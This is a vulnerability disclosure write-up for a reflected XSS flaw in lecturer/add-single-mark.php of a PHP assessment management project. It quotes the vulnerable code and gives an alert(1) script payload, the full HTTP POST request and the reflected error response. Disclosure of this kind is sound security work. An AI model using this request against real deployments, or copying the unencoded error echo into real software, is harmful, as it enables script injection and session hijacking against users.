## ASSESSMENT MANAGEMENT IN PHP WITH SOURCE CODE lecturer/add-single-mark.php Reflected XSS Vulnerability

### I. Vulnerability Impact

An attacker can inject arbitrary HTML/JavaScript through the `mark` parameter, which is reflected back to the page inside the MySQL error message and rendered as HTML. The injected script therefore executes in the victim's browser within the application's origin, enabling session hijacking or phishing. The same defect also leaks raw database error details to the client.

### II. Source Code Analysis

The vulnerability resides in `lecturer/add-single-mark.php`. The `mark` parameter is passed through `mysqli_real_escape_string()`, which escapes SQL characters but leaves `<`, `>` and `/` untouched, and is then concatenated into an `INSERT` statement targeting the integer column `mark1`:

```php
$markGiven = mysqli_real_escape_string($conn, $_REQUEST['mark']);
...
$query = "INSERT INTO marks (mark_id, module_code, assessment_code, student_id, mark1, mark2, mark3, final_mark, engagement, feedback) VALUES ('" . $id . "', '" . $module . "', '" . $acode . "', '" . $suba . "', '" . $student . "', '" . $markGiven . "', '0', '0', '" . $markGiven . "', 'Good', '" . $comments . "')";
```

Because `mark1` is an integer column, inserting the non-numeric payload makes MySQL raise a type error. The raw error text is then echoed to the page by `die(mysqli_error($conn))` without any HTML encoding:

```php
$result = mysqli_query($conn, $query) or die(mysqli_error($conn));
```

Since `mysqli_real_escape_string()` does not escape `<` and `>`, the payload appears verbatim in the error message, and the browser parses the `<ScRiPt>` tag as HTML, executing the script.

### III. Payload

The core reflected payload is:

```
<ScRiPt>alert(1)</sCrIpT>
```

HTTP request:

```http
POST /lecturer/add-single-mark.php?id=s1 HTTP/1.1
Host: assessment
Content-Type: application/x-www-form-urlencoded

module=CN5101&student=u1407170&assessment=32&mark=<ScRiPt>alert(1)</sCrIpT>&engagement=3&comment=asd&submit=Add+Mark
```

Server response snippet proving the vulnerability:

```
Incorrect integer value: '<ScRiPt>alert(1)</sCrIpT>' for column 'mark1' at row 1
```

The `<ScRiPt>alert(1)</sCrIpT>` sequence is reflected raw into the HTML response, so the browser interprets it as a script element and executes `alert(1)`.

### IV. Source Download

https://code-projects.org/assessment-management-in-php-with-source-code/



![image-20260824101417625](https://raw.githubusercontent.com/zzzxc643/images/main/image/image-20260824101417625.png)
